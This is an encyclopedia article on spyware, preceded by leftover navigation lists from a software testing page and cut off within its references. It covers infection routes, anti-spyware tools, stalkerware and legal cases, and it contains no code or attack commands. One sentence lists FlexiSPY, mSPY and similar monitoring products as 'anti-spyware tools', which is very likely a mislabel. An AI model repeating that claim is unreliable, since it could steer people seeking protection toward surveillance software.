Software engineering


Software maintenance


Programming team


Open-source model


Theory of computation


Model of computation


Stochastic


Formal language


Automata theory


Computability theory


Computational complexity theory


Logic


Semantics


Algorithms


Algorithm design


Analysis of algorithms


Algorithmic efficiency


Randomized algorithm


Computational geometry


Mathematics of 
computing


Discrete mathematics


Probability


Statistics


Mathematical software


Information theory


Mathematical analysis


Numerical analysis


Theoretical computer science


Information systems


Database management system


Information storage systems


Enterprise information system


Social information systems


Geographic information system


Decision support system


Process control system


Multimedia information system


Data mining


Digital library


Computing platform


Digital marketing


World Wide Web


Information retrieval


Security


Cryptography


Formal methods


Security hacker


Security services


Intrusion detection system


Hardware security


Network security


Information security


Application security


Human–computer interaction


Interaction design


Social computing


Ubiquitous computing


Visualization


Accessibility


Concurrency


Concurrent computing


Parallel computing


Distributed computing


Multithreading


Multiprocessing


Artificial intelligence


Natural language processing


Knowledge representation and reasoning


Computer vision


Automated planning and scheduling


Search methodology


Control method


Philosophy of artificial intelligence


Distributed artificial intelligence


Machine learning


Supervised learning


Unsupervised learning


Reinforcement learning


Multi-task learning


Cross-validation


Graphics


Animation


Rendering


Photograph manipulation


Graphics processing unit


Mixed reality


Virtual reality


Image compression


Solid modeling


Applied computing


Quantum Computing


E-commerce


Enterprise software


Computational mathematics


Computational physics


Computational chemistry


Computational biology


Computational social science


Computational engineering


Differentiable computing


Computational healthcare


Digital art


Electronic publishing


Cyberwarfare


Electronic voting


Video games


Word processing


Operations research


Educational technology


Document management




 
Category


 
Outline


 
Glossaries




v
t
e
Software engineering
Fields


Computer programming


DevOps


Empirical software engineering


Experimental software engineering


Formal methods


Requirements engineering


Search-based software engineering


Site reliability engineering


Social software engineering


Software deployment


Software design


Software maintenance


Software testing


Systems analysis


Concepts


Abstraction


Component-based software engineering


Software compatibility


Backward compatibility


Compatibility layer


Compatibility mode


Forward compatibility


Software incompatibility


Data modeling


Enterprise architecture


Functional specification


Modeling language


Programming paradigm


Software


Software archaeology


Software architecture


Software configuration management


Software development process/methodology


Software quality


Software quality assurance


Software verification and validation


Software system


Structured analysis


Essential analysis


CI/CD


Orientations


Agile


Aspect-oriented


Object orientation


Ontology


Service orientation


SDLC


Models
Developmental


Agile


EUP


Executable UML


Incremental model


Iterative model


Prototype model


RAD


UP


Scrum


Spiral model


V-model


Waterfall model


XP


Model-driven engineering


Round-trip engineering


Other


SPICE


CMMI


Data model


ER model


Function model


Information model


Metamodeling


Object model


Systems model


View model


Languages


IDEF


UML


USL


SysML


Related fields


Computer science


Computer engineering


Information science


Project management


Risk management


Systems engineering




 
Commons


 
Category




v
t
e
Software testing
The "box" approach


Black-box testing


All-pairs testing


Exploratory testing


Fuzz testing


Model-based testing


Scenario testing


Grey-box testing


White-box testing


API testing


Mutation testing


Static testing


Testing levels


Acceptance testing


Integration testing


System testing


Unit testing


Testing types, techniques,
and 
tactics


A/B testing


Benchmark


Compatibility testing


Concolic testing


Concurrent testing


Conformance testing


Continuous testing


Destructive testing


Development testing


Differential testing


Dynamic program analysis


Installation testing


Negative testing


Random testing


Regression testing


Security testing


Smoke testing (software)


Software performance testing


Stress testing


Symbolic execution


Test automation


Usability testing


See also


Graphical user interface testing


Manual testing


Orthogonal array testing


Pair testing


Soak testing


Software reliability testing


Stress testing


Web testing




Authority control databases
: National 
Czech Republic










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Software_testing&oldid=1246982570
"


Categories
: 
Software testing
Software engineering terminology
Hidden categories: 
Webarchive template wayback links
Articles with short description
Short description is different from Wikidata
Use mdy dates from December 2021
All accuracy disputes
Articles with disputed statements from September 2014
All articles with unsourced statements
Articles with unsourced statements from March 2024
Articles with excerpts
Articles with unsourced statements from January 2008
Articles with unsourced statements from July 2012
Articles with unsourced statements from December 2017
Articles with unsourced statements from February 2011
Pages displaying wikidata descriptions as a fallback via Module:Annotated link
Commons category link from Wikidata
Articles with Curlie links











From Wikipedia, the free encyclopedia






Malware that collects and transmits user information without their knowledge






Part of a series on
Computer hacking


History


Phreaking


Cryptovirology


Hacking of consumer electronics


List of hackers




Hacker culture
 and 
ethic


Hackathon


Hacker Manifesto


Hackerspace


Hacktivism


Maker culture


Types of 
hackers


Black hat


Grey hat


White hat




Conferences


Black Hat Briefings


Chaos Communication Congress


DEF CON


Hackers on Planet Earth


Security BSides


ShmooCon


Summercon




Computer crime


Crimeware


List of computer criminals


Script kiddie




Hacking tools


Exploit


forensics-focused operating systems


Payload


Social engineering


Vulnerability




Practice sites


HackThisSite


Zone-H




Malware


Rootkit


Backdoor


Trojan horse


Virus


Worm


Spyware


Ransomware


Logic bomb


Botnet


Keystroke logging


HIDS


Web shell


RCE


Infostealer




Computer security


Application security


Cloud computing security


Network security




Groups


Anonymous


Chaos Computer Club


Homebrew Computer Club
 (defunct)


Legion of Doom
 (defunct)


LulzSec
 (defunct)


Masters of Deception
 (defunct)


Red team
 / 
Blue team




Publications


2600: The Hacker Quarterly


Hacker News


Nuts and Volts


Phrack


v
t
e


Spyware
 (a 
portmanteau
 for 
spying software
) is any 
software
 with malicious behavior that aims to gather information about a person or organization and send it to another entity in a way that harms the user by violating their 
privacy
, endangering their device's security, or other means. This behavior may be present in 
malware
 and in legitimate software. Websites may engage in spyware behaviors like 
web tracking
. Hardware devices may also be affected.
[
1
]


Spyware is frequently associated with 
advertising
 and involves many of the same 
issues
. Because these behaviors are so common, and can have non-harmful uses, providing a precise definition of spyware is a difficult task.
[
2
]






History
[
edit
]


The first recorded use of the term 
spyware
 occurred on October 16, 1995, in a 
Usenet
 post that poked fun at 
Microsoft
's 
business model
.
[
3
]
 
Spyware
 at first denoted 
software
 meant for 
espionage
 purposes. However, in early 2000 the founder of 
Zone Labs
, Gregor Freund, used the term in a press release for the 
ZoneAlarm Personal Firewall
.
[
4
]
 Later in 2000, a parent using ZoneAlarm was alerted to the fact that 
Reader Rabbit
, educational software marketed to children by the 
Mattel
 toy company, was surreptitiously sending data back to Mattel.
[
5
]
 Since then, "spyware" has taken on its present sense.

According to a 2005 study by 
AOL
 and the National Cyber-Security Alliance, 61 percent of surveyed users' computers were infected with some form of spyware. 92 percent of surveyed users with spyware reported that they did not know of its presence, and 91 percent reported that they had not given permission for the installation of the spyware.
[
6
]

As of 2006
[update]
, spyware has become one of the preeminent security threats to computer systems running Microsoft Windows 
operating systems
. Computers on which 
Internet Explorer
 (IE) was the primary 
browser
 are particularly vulnerable to such attacks, not only because IE was the most widely used,
[
7
]
 but also because its tight integration with Windows allows spyware access to crucial parts of the operating system.
[
7
]
[
8
]


Before 
Internet Explorer 6
 SP2 was released as part of 
Windows XP Service Pack 2
, the browser would automatically display an installation window for any 
ActiveX
 component that a website wanted to install. The combination of user ignorance about these changes, and the assumption by 
Internet Explorer
 that all 
ActiveX
 components are benign, helped to spread spyware significantly. Many spyware components would also make use of 
exploits
 in 
JavaScript
, Internet Explorer and Windows to install without user knowledge or permission.

The 
Windows Registry
 contains multiple sections where modification of key values allows software to be executed automatically when the operating system boots. Spyware can exploit this design to circumvent attempts at removal. The spyware typically links itself to each location in the 
registry
 that allows execution. Once running, the spyware will periodically check if any of these links are removed. If so, they will be automatically restored. This ensures that the spyware will execute when the operating system is booted, even if some (or most) of the registry links are removed.



Overview
[
edit
]


Spyware is mostly classified into four types: 
adware
, system monitors, tracking including 
web tracking
, and 
trojans
;
[
9
]
 examples of other notorious types include 
digital rights management
 capabilities that "phone home", 
keyloggers
, 
rootkits
, and 
web beacons
. These four categories are not mutually exclusive and they have similar tactics in attacking networks and devices.
[
10
]
 The main goal is to install, hack into the network, avoid being detected, and safely remove themselves from the network.
[
10
]


Spyware is mostly used for the stealing information and storing Internet users' movements on the Web and serving up pop-up ads to Internet users.
[
11
]
 Whenever spyware is used for malicious purposes, its presence is typically hidden from the user and can be difficult to detect. Some spyware, such as 
keyloggers
, may be installed by the owner of a shared, corporate, or 
public computer
 intentionally in order to monitor users.

While the term 
spyware
 suggests software that monitors a user's computer, the functions of spyware can extend beyond simple monitoring. Spyware can collect almost any type of data, including personal information like 
internet surfing
 habits, user logins, and bank or credit account information. Spyware can also interfere with a user's control of a computer by installing additional software or redirecting 
web browsers
.
[
12
]
 Some spyware can change computer settings, which can result in slow Internet connection speeds, un-authorized changes in browser settings, or changes to software settings.

Sometimes, spyware is included along with genuine software, and may come from a malicious website or may have been added to the intentional functionality of genuine software (see the paragraph about 
Facebook
, below). In response to the emergence of spyware, a small industry has sprung up dealing in 
anti-spyware
 software. Running anti-spyware software has become a widely recognized element of 
computer security
 practices, especially for computers running 
Microsoft Windows
. A number of jurisdictions have passed anti-spyware laws, which usually target any software that is surreptitiously installed to control a user's computer.

In German-speaking countries, spyware used or made by the government is called 
govware
 by computer experts (in common parlance: 
Regierungstrojaner
, literally "Government Trojan"). Govware is typically a trojan horse software used to intercept communications from the target computer. Some countries, like Switzerland and Germany, have a legal framework governing the use of such software.
[
13
]
[
14
]
 In the US, the term "
policeware
" has been used for similar purposes.
[
15
]


Use of the term "spyware" has eventually declined as the practice of tracking users has been pushed ever further into the mainstream by major websites and data mining companies; these generally break no known laws and compel users to be tracked, not by fraudulent practices 
per se
, but by the default settings created for users and the language of terms-of-service agreements. 

In one documented example, on CBS/CNet News reported, on March 7, 2011, an analysis in 
The Wall Street Journal
 revealed the practice of 
Facebook
 and other websites of 
tracking users' browsing activity
, which is linked to their identity, far beyond users' visits and activity on the Facebook site itself. The report stated: "Here's how it works. You go to Facebook, you log in, you spend some time there, and then ... you move on without logging out. Let's say the next site you go to is 
The New York Times
. Those buttons, without you clicking on them, have just reported back to Facebook and 
Twitter
 that you went there and also your identity within those accounts. Let's say you moved on to something like a site about depression. This one also has a tweet button, a 
Google
 widget, and those, too, can report back who you are and that you went there." 
The Wall Street Journal
 analysis was researched by Brian Kennish, founder of Disconnect, Inc.
[
16
]




Routes of infection
[
edit
]


Spyware does not necessarily spread in the same way as a 
virus
 or 
worm
 because infected systems generally do not attempt to transmit or copy the software to other computers. Instead, spyware installs itself on a system by deceiving the user or by 
exploiting
 software vulnerabilities.

Most spyware is installed without knowledge, or by using deceptive tactics. Spyware may try to deceive users by bundling itself with desirable software. Other common tactics are using a 
Trojan horse
, spy gadgets that look like normal devices but turn out to be something else, such as a USB Keylogger. These devices actually are connected to the device as memory units but are capable of recording each stroke made on the keyboard. Some spyware authors infect a system through security holes in the Web browser or in other software. When the user navigates to a Web page controlled by the spyware author, the page contains code which attacks the browser and forces the download and installation of spyware.

The installation of spyware frequently involves 
Internet Explorer
. Its popularity and history of security issues have made it a frequent target. Its deep integration with the Windows environment make it susceptible to attack into the 
Windows
 
operating system
. Internet Explorer also serves as a point of attachment for spyware in the form of 
Browser Helper Objects
, which modify the browser's behaviour.



Effects and behaviors
[
edit
]


This section 
relies largely or entirely upon a 
single source
.
 Relevant discussion may be found on the 
talk page
. Please help 
improve this article
 by introducing 
citations
 to additional sources at this section.
 
(
December 2018
)
 (
Learn how and when to remove this message
)


A spyware rarely operates alone on a computer; an affected machine usually has multiple infections. Users frequently notice unwanted behavior and degradation of system performance. A spyware infestation can create significant unwanted 
CPU
 activity, disk usage, and network traffic. Stability issues, such as applications freezing, failure to boot, and system-wide crashes are also common. Usually, this effect is intentional, but may be caused from the malware simply requiring large amounts of computing power, disk space, or network usage. Spyware, which interferes with networking software commonly causes difficulty connecting to the Internet.

In some infections, the spyware is not even evident. Users assume in those situations that the performance issues relate to faulty hardware, Windows installation problems, or another 
malware
 infection. Some owners of badly infected systems resort to contacting 
technical support
 experts, or even buying a new computer because the existing system "has become too slow". Badly infected systems may require a clean reinstallation of all their software in order to return to full functionality.

Moreover, some types of spyware disable software 
firewalls
 and 
antivirus software
, and/or reduce browser security settings, which opens the system to further 
opportunistic infections
. Some spyware disables or even removes competing spyware programs, on the grounds that more spyware-related annoyances increase the likelihood that users will take action to remove the programs.
[
17
]


Keyloggers
 are sometimes part of malware packages downloaded onto computers without the owners' knowledge. Some keylogger software is freely available on the internet, while others are commercial or private applications. Most keyloggers allow not only keyboard keystrokes to be captured, they also are often capable of collecting screen captures from the computer.

A typical Windows user has 
administrative privileges
, mostly for convenience. Because of this, any program the user runs has unrestricted access to the system. As with other 
operating systems
, Windows users are able to follow the 
principle of least privilege
 and use non-
administrator
 accounts. Alternatively, they can reduce the 
privileges
 of specific vulnerable Internet-facing 
processes
, such as 
Internet Explorer
.

Since 
Windows Vista
 is, by default, a computer administrator that runs everything under limited user privileges, when a program requires administrative privileges, a 
User Account Control
 pop-up will prompt the user to allow or deny the action. This improves on the design used by previous versions of Windows.
Spyware is also known as tracking software.



Remedies and prevention
[
edit
]


See also: 
Computer virus § Virus removal


As the spyware threat has evolved, a number of techniques have emerged to counteract it. These include programs designed to remove or block spyware, as well as various user practices which reduce the chance of getting spyware on a system.

Nonetheless, spyware remains a costly problem. When a large number of pieces of spyware have infected a Windows computer, the only remedy may involve 
backing up
 user data, and fully reinstalling the 
operating system
. For instance, some spyware cannot be completely removed by Symantec, Microsoft, PC Tools.



Anti-spyware programs
[
edit
]


See also: 
Category:Spyware removal


Many programmers and some commercial firms have released products designed to remove or block spyware. Programs such as PC Tools' 
Spyware Doctor
, Lavasoft's 
Ad-Aware SE
 and Patrick Kolla's 
Spybot - Search & Destroy
 rapidly gained popularity as tools to remove, and in some cases intercept, spyware programs.  On December, 2004, 
Microsoft
 acquired the 
GIANT AntiSpyware
 software,
[
18
]
 re‑branding it as 
Microsoft AntiSpyware (Beta 1)
 and releasing it as a free download for Genuine Windows XP and Windows 2003 users. In November, 2005, it was renamed 
Windows Defender
.
[
19
]
[
20
]


Major anti-virus firms such as 
Symantec
, 
PC Tools
, 
McAfee
 and 
Sophos
 have also added anti-spyware features to their existing anti-virus products. Early on, anti-virus firms expressed reluctance to add anti-spyware functions, citing lawsuits brought by spyware authors against the authors of web sites and programs which described their products as "spyware". However, recent versions of these major firms home and business anti-virus products do include anti-spyware functions, albeit treated differently from viruses. Symantec Anti-Virus, for instance, categorizes spyware programs as "extended threats" and now offers 
real-time protection
 against these threats.

Other Anti-spyware tools include FlexiSPY, Mobilespy, mSPY, TheWiSPY, and UMobix.
[
21
]




How anti-spyware software works
[
edit
]


Anti-spyware programs can combat spyware in two ways:



They can provide 
real-time protection
 in a manner similar to that of 
anti-virus
 protection: all incoming 
network
 data is scanned for spyware, and any detected threats are blocked.


Anti-spyware software programs can be used solely for detection and removal of spyware software that has already been installed into the computer. This kind of anti-spyware can often be set to scan on a regular schedule.


Such programs inspect the contents of the 
Windows registry
, 
operating system
 files, and 
installed programs
, and remove files and entries which match a list of known spyware. Real-time protection from spyware works identically to real-time anti-virus protection: the software scans disk files at download time, and blocks the activity of components known to represent spyware.
In some cases, it may also intercept attempts to install start-up items or to modify browser settings. Earlier versions of anti-spyware programs focused chiefly on detection and removal. Javacool Software's 
SpywareBlaster
, one of the first to offer real-time protection, blocked the installation of 
ActiveX
-based spyware.

Like most anti-virus software, many anti-spyware/adware tools require a frequently updated database of threats. As new spyware programs are released, anti-spyware developers discover and evaluate them, adding to the list of known spyware, which allows the software to detect and remove new spyware. As a result, anti-spyware software is of limited usefulness without regular updates. Updates may be installed automatically or manually.

A popular generic spyware removal tool used by those that requires a certain degree of expertise is 
HijackThis
, which scans certain areas of the Windows OS where spyware often resides and presents a list with items to delete manually. As most of the items are legitimate windows files/registry entries it is advised for those who are less knowledgeable on this subject to post a HijackThis log on the numerous antispyware sites and let the experts decide what to delete.

If a spyware program is not blocked and manages to get itself installed, it may resist attempts to terminate or uninstall it. Some programs work in pairs: when an anti-spyware scanner (or the user) terminates one running process, the other one respawns the killed program. Likewise, some spyware will detect attempts to remove registry keys and immediately add them again. Usually, booting the infected computer in 
safe mode
 allows an anti-spyware program a better chance of removing persistent spyware. Killing the process tree may also work.



Security practices
[
edit
]


To detect spyware, computer users have found several practices useful in addition to installing anti-spyware programs.  Many users have installed a 
web browser
 other than 
Internet Explorer
, such as 
Mozilla Firefox
 or 
Google Chrome
. Though no browser is completely safe, Internet Explorer was once at a greater risk for spyware infection due to its large user base as well as vulnerabilities such as 
ActiveX
 but these three major browsers are now close to equivalent when it comes to security.
[
22
]
[
23
]


Some 
ISPs
—particularly colleges and universities—have taken a different approach to blocking spyware: they use their network 
firewalls
 and 
web proxies
 to block access to Web sites known to install spyware. On March 31, 2005, 
Cornell University
's Information Technology department released a report detailing the behavior of one particular piece of proxy-based spyware, 
Marketscore
, and the steps the university took to intercept it.
[
24
]
 Many other educational institutions have taken similar steps.

Individual users can also install 
firewalls
 from a variety of companies.  These monitor the flow of information going to and from a networked computer and provide protection against spyware and malware.  Some users install a large 
hosts file
 which prevents the user's computer from connecting to known spyware-related web addresses.  Spyware may get installed via certain 
shareware
 programs offered for download. Downloading programs only from reputable sources can provide some protection from this source of attack.
[
25
]


Individual users can use cellphone / computer with physical (electric) switch, or isolated electronic switch that disconnects microphone, camera without bypass and keep it in disconnected position where not in use, that limits information that spyware can collect. (Policy recommended by NIST Guidelines for Managing the Security of Mobile Devices, 2013).



Applications
[
edit
]


"Stealware" and affiliate fraud
[
edit
]


A few spyware vendors, notably 
180 Solutions
, have written what the 
New York Times
 has dubbed "
stealware
", and what spyware researcher 
Ben Edelman
 terms 
affiliate fraud
, a form of 
click fraud
. Stealware diverts the payment of 
affiliate marketing
 revenues from the legitimate affiliate to the spyware vendor.

Spyware which attacks 
affiliate networks
 places the spyware operator's affiliate tag on the user's activity – replacing any other tag, if there is one. The spyware operator is the only party that gains from this. The user has their choices thwarted, a legitimate affiliate loses revenue, networks' reputations are injured, and vendors are harmed by having to pay out affiliate revenues to an "affiliate" who is not party to a contract.
[
26
]
 
Affiliate fraud
 is a violation of the 
terms of service
 of most affiliate marketing networks. Mobile devices can also be vulnerable to 
chargeware
, which manipulates users into illegitimate mobile charges.



Identity theft and fraud
[
edit
]


In one case, spyware has been closely associated with 
identity theft
.
[
27
]
 In August 2005, researchers from security software firm Sunbelt Software suspected the creators of the common CoolWebSearch spyware had used it to transmit "
chat sessions
, 
user names
, 
passwords
, bank information, etc.";
[
28
]
 however it turned out that "it actually (was) its own sophisticated criminal little trojan that's independent of CWS."
[
29
]
 This case is currently under investigation by the 
FBI
.

The 
Federal Trade Commission
 estimates that 27.3 million Americans have been victims of identity theft, and that financial losses from identity theft totaled nearly $48 billion for businesses and financial institutions and at least $5 billion in out-of-pocket expenses for individuals.
[
30
]




Digital rights management
[
edit
]


Some copy-protection technologies have borrowed from spyware. In 2005, 
Sony BMG Music Entertainment
 was 
found to be using
 
rootkits
 in its 
XCP
 
digital rights management
 technology
[
31
]
 Like spyware, not only was it difficult to detect and uninstall, it was so poorly written that most efforts to remove it could have rendered computers unable to function.

Texas Attorney General
 
Greg Abbott
 filed suit,
[
32
]
 and three separate 
class-action
 suits were filed.
[
33
]
 Sony BMG later provided a workaround on its website to help users remove it.
[
34
]


Beginning on April 25, 2006, Microsoft's 
Windows Genuine Advantage
 Notifications application
[
35
]
 was installed on most Windows PCs as a "critical security update". While the main purpose of this deliberately uninstallable application is to ensure the copy of Windows on the machine was lawfully purchased and installed, it also installs software that has been accused of "
phoning home
" on a daily basis, like spyware.
[
36
]
[
37
]
 It can be removed with the RemoveWGA tool.



Personal relationships
[
edit
]


Stalkerware
 is spyware that has been used to monitor electronic activities of partners in intimate relationships. At least one software package, Loverspy, was specifically marketed for this purpose. Depending on local laws regarding communal/marital property, observing a partner's online activity without their consent may be illegal; the author of Loverspy and several users of the product were indicted in California in 2005 on charges of wiretapping and various computer crimes.
[
38
]




Browser cookies
[
edit
]


Anti-spyware programs often report Web advertisers' 
HTTP cookies
, the small text files that track browsing activity, as spyware. While they are not always inherently malicious, many users object to third parties using space on their personal computers for their business purposes, and many anti-spyware programs offer to remove them.
[
39
]




Shameware
[
edit
]


Shameware or "
accountability software
" is a type of spyware that is not hidden from the user, but operates with their knowledge, if not necessarily their consent. Parents, religious leaders or other authority figures may require their children or congregation members to install such software, which is intended to detect the viewing of 
pornography
 or other content deemed inappropriate, and to report it to the authority figure, who may then confront the user about it.
[
40
]




Spyware programs
[
edit
]


Main article: 
List of spyware programs


These common spyware programs illustrate the diversity of behaviors found in these attacks. Note that as with computer viruses, researchers give names to spyware programs which may not be used by their creators. Programs may be grouped into "families" based not on shared program code, but on common behaviors, or by "following the money" of apparent financial or business connections. For instance, a number of the spyware programs distributed by 
Claria
 are collectively known as "Gator". Likewise, programs that are frequently installed together may be described as parts of the same spyware package, even if they function separately.



Spyware vendors
[
edit
]


Spyware vendors include 
NSO Group
, which in the 2010s sold spyware to governments for spying on 
human rights activists
 and 
journalists
.
[
41
]
[
42
]
[
43
]
 NSO Group was investigated by 
Citizen Lab
.
[
41
]
[
43
]




Rogue anti-spyware programs
[
edit
]


See also: 
List of rogue security software
 and 
Rogue security software


Malicious programmers have released a large number of 
rogue
 (fake) anti-spyware programs, and widely distributed Web 
banner ads
 can warn users that their computers have been infected with spyware, directing them to purchase programs which do not actually remove spyware—or else, may add more spyware of their own.
[
44
]
[
45
]


The recent
[update]
 proliferation of fake or spoofed antivirus products that bill themselves as antispyware can be troublesome.  Users may receive popups prompting them to install them to protect their computer, when it will in fact add spyware. It is recommended that users do not install any freeware claiming to be anti-spyware unless it is verified to be legitimate. Some known offenders include:





AntiVirus 360
 & 
Antivirus 2009


MacSweeper


Pest Trap


PSGuard


Spy Wiper


Spydawn


Spylocked


Spysheriff


SpyShredder


Spyware Quake


SpywareStrike


WinAntiVirus Pro 2006


Windows Police Pro


WinFixer
[
46
]


WorldAntiSpy




Fake antivirus products constitute 15 percent of all malware.
[
47
]


On January 26, 2006, Microsoft and the Washington state attorney general filed suit against Secure Computer for its Spyware Cleaner product.
[
48
]




Legal issues
[
edit
]


Criminal law
[
edit
]


Unauthorized access to a computer is illegal under 
computer crime
 laws, such as the U.S. 
Computer Fraud and Abuse Act
, the U.K.'s 
Computer Misuse Act
, and similar laws in other countries. Since owners of computers infected with spyware generally claim that they never authorized the installation, a 
prima facie
 reading would suggest that the promulgation of spyware would count as a criminal act. Law enforcement has often pursued the authors of other malware, particularly viruses. However, few spyware developers have been prosecuted, and many operate openly as strictly legitimate businesses, though some have faced lawsuits.
[
49
]
[
50
]


Spyware producers argue that, contrary to the users' claims, users do in fact give 
consent
 to installations. Spyware that comes bundled with 
shareware
 applications may be described in the 
legalese
 text of an 
end-user license agreement
 (EULA). Many users habitually ignore these purported contracts, but spyware companies such as Claria say these demonstrate that users have consented.

Despite the ubiquity of 
EULAs
 agreements, under which a single click can be taken as consent to the entire text, relatively little 
caselaw
 has resulted from their use. It has been established in most 
common law
 jurisdictions that this type of agreement can be a binding contract 
in certain circumstances.
[
51
]
 This does not, however, mean that every such agreement is a contract, or that every term in one is enforceable.

Some jurisdictions, including the U.S. states of 
Iowa
[
52
]
 and 
Washington
,
[
53
]
 have passed laws criminalizing some forms of spyware. Such laws make it illegal for anyone other than the owner or operator of a computer to install software that alters Web-browser settings, monitors keystrokes, or disables computer-security software.

In the United States, lawmakers introduced a bill in 2005 entitled the 
Internet Spyware Prevention Act
, which would imprison creators of spyware.
[
54
]




Administrative sanctions
[
edit
]


US FTC actions
[
edit
]


The US 
Federal Trade Commission
 has sued 
Internet marketing
 organizations under the "
unfairness doctrine
"
[
55
]
 to make them stop infecting consumers' PCs with spyware. In one case, that against Seismic Entertainment Productions, the FTC accused the defendants of developing a program that seized control of PCs nationwide, infected them with spyware and other malicious software, bombarded them with a barrage of pop-up advertising for Seismic's clients, exposed the PCs to security risks, and caused them to malfunction. Seismic then offered to sell the victims an "antispyware" program to fix the computers, and stop the popups and other problems that Seismic had caused. On November 21, 2006, a settlement was entered in federal court under which a $1.75 million judgment was imposed in one case and $1.86 million in another, but the defendants were insolvent
[
56
]


In a second case, brought against CyberSpy Software LLC, the 
FTC
 charged that CyberSpy marketed and sold "RemoteSpy" keylogger spyware to clients who would then secretly monitor unsuspecting consumers' computers. According to the FTC, Cyberspy touted RemoteSpy as a "100% undetectable" way to "Spy on Anyone. From Anywhere." The FTC has obtained a temporary order prohibiting the defendants from selling the software and disconnecting from the Internet any of their servers that collect, store, or provide access to information that this software has gathered. The case is still in its preliminary stages.  A complaint filed by the 
Electronic Privacy Information Center
 (EPIC) brought the RemoteSpy software to the FTC's attention.
[
57
]




Netherlands OPTA
[
edit
]


An administrative fine, the first of its kind in Europe, has been issued by the Independent Authority of Posts and Telecommunications (OPTA) from the Netherlands. It applied fines in total value of Euro 1,000,000 for infecting 22 million computers. The spyware concerned is called DollarRevenue. The law articles that have been violated are art. 4.1 of the Decision on universal service providers and on the interests of end users; the fines have been issued based on art. 15.4 taken together with art. 15.10 of the Dutch telecommunications law.
[
58
]




Civil law
[
edit
]


Former 
New York State Attorney General
 and former 
Governor of New York
 
Eliot Spitzer
 has pursued spyware companies for fraudulent installation of software.
[
59
]
 In a suit brought in 2005 by Spitzer, the California firm 
Intermix Media, Inc.
 ended up settling, by agreeing to pay US$7.5 million and to stop distributing spyware.
[
60
]


The hijacking of Web advertisements has also led to litigation. In June 2002, a number of large Web publishers sued 
Claria
 for replacing advertisements, but settled out of court.

Courts have not yet had to decide whether advertisers can be held 
liable
 for spyware that displays their ads. In many cases, the companies whose advertisements appear in spyware pop-ups do not directly do business with the spyware firm. Rather, they have contracted with an 
advertising agency
, which in turn contracts with an online subcontractor who gets paid by the number of "impressions" or appearances of the advertisement. Some major firms such as 
Dell Computer
 and 
Mercedes-Benz
 have sacked advertising agencies that have run their ads in spyware.
[
61
]




Libel suits by spyware developers
[
edit
]


Litigation has gone both ways. Since "spyware" has become a common 
pejorative
, some makers have filed 
libel
 and 
defamation
 actions when their products have been so described. In 2003, Gator (now known as Claria) filed suit against the website 
PC Pitstop
 for describing its program as "spyware".
[
62
]
 PC Pitstop settled, agreeing not to use the word "spyware", but continues to describe harm caused by the Gator/Claria software.
[
63
]
 As a result, other anti-spyware and anti-virus companies have also used other terms such as "potentially unwanted programs" or 
greyware
 to denote these products.



WebcamGate
[
edit
]


Main article: 
Robbins v. Lower Merion School District


In the 2010 
WebcamGate
 case, plaintiffs charged two suburban Philadelphia high schools secretly spied on students by surreptitiously and remotely activating webcams embedded in school-issued laptops the students were using at home, and therefore infringed on their privacy rights.  The school loaded each student's computer with 
LANrev
's remote activation tracking software.  This included the now-discontinued "TheftTrack".  While TheftTrack was not enabled by default on the software, the program allowed the school district to elect to activate it, and to choose which of the TheftTrack surveillance options the school wanted to enable.
[
64
]


TheftTrack allowed school district employees to secretly remotely activate the webcam embedded in the student's laptop, above the laptop's screen. That allowed school officials to secretly take photos through the webcam, of whatever was in front of it and in its line of sight, and send the photos to the school's server. The LANrev software disabled the webcams for all other uses (
e.g.
, students were unable to use 
Photo Booth
 or 
video chat
), so most students mistakenly believed their webcams did not work at all. On top of the webcam surveillance, TheftTrack allowed school officials to take screenshots and send them to the school's server. School officials were also granted the ability to take snapshots of instant messages, web browsing, music playlists, and written compositions. The schools admitted to secretly snapping over 66,000 webshots and 
screenshots
, including webcam shots of students in their bedrooms.
[
64
]
[
65
]
[
66
]




See also
[
edit
]


Cuckoo's egg
 (metaphor)


Cyber spying


Employee monitoring software


Industrial espionage


Infostealer


Malware


Phishing


Superfish


Technical support scam


Microphone blocker


References
[
edit
]






^
 
"Amazon Workers Are Listening to What You Tell Alexa"
. 
Bloomberg.com
. April 10, 2019. 
Archived
 from the original on August 29, 2020
. Retrieved 
August 25,
 2020
.




^
 
Monitoring Software on Your PC: Spyware, Adware, and Other Software
 
(PDF)
 (Report). March 2005. Archived from 
the original
 
(PDF)
 on December 26, 2010.




^
 
Vossen, Roland (attributed); October 21, 1995; 
Win 95 Source code in c!!
 posted to rec..programmer; retrieved from groups.google.com November 28, 2006.  
[
dead link
]




^
 
Wienbar, Sharon. "
The Spyware Inferno
 
Archived
 May 10, 2011, at the 
Wayback Machine
". 
News.com
. August 13, 2004.




^
 
Hawkins, Dana; "
Privacy Worries Arise Over Spyware in Kids' Software
". 
U.S. News & World Report
. June 25, 2000 
Archived
 November 3, 2013, at the 
Wayback Machine




^
 
"
AOL/NCSA Online Safety Study
 
Archived
 December 13, 2005, at the 
Wayback Machine
". 
America Online
 & 
The National Cyber Security Alliance
. 2005.




^ 
a
 
b
 
Spanbauer, Scott. "
Is It Time to Ditch IE?
 
Archived
 December 16, 2006, at the 
Wayback Machine
". 
Pcworld.com
. September 1, 2004




^
 
Keizer, Gregg. "
Analyzing IE At 10: Integration With OS Smart Or Not?
". 
TechWeb Technology News
. August 25, 2005. 
Archived
 September 29, 2007, at the 
Wayback Machine




^
 
"SPYWARE"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on November 1, 2013
. Retrieved 
February 5,
 2016
.




^ 
a
 
b
 
Kim, Taejin; Yi, Jeong Hyun; Seo, Changho (January 2014). 
"Spyware Resistant Smartphone User Authentication Scheme"
. 
International Journal of Distributed Sensor Networks
. 
10
 (3): 237125. 
doi
:
10.1155/2014/237125
. 
ISSN
 
1550-1477
. 
S2CID
 
12611804
.




^
 
Bergren, Martha Dewey (October 1, 2004). 
"Spyware"
. 
The Journal of School Nursing
. 
20
 (5): 293–294. 
doi
:
10.1177/10598405040200050801
. 
ISSN
 
1059-8405
. 
PMID
 
15469380
.




^
 
Ames, Wes (2004). "Understanding spyware: risk and response". 
IT Professional
. 
6
 (5): 25–29. 
doi
:
10.1109/MITP.2004.71
.




^
 
Basil Cupa, 
Trojan Horse Resurrected: On the Legality of the Use of Government Spyware (Govware)
 
Archived
 February 1, 2014, at the 
Wayback Machine
, LISS 2013, pp. 419–428




^
 
FAQ – Häufig gestellte Fragen
 
Archived
 May 6, 2013, at the 
Wayback Machine




^
 
Jeremy Reimer (July 20, 2007). 
"The tricky issue of spyware with a badge: meet 'policeware'
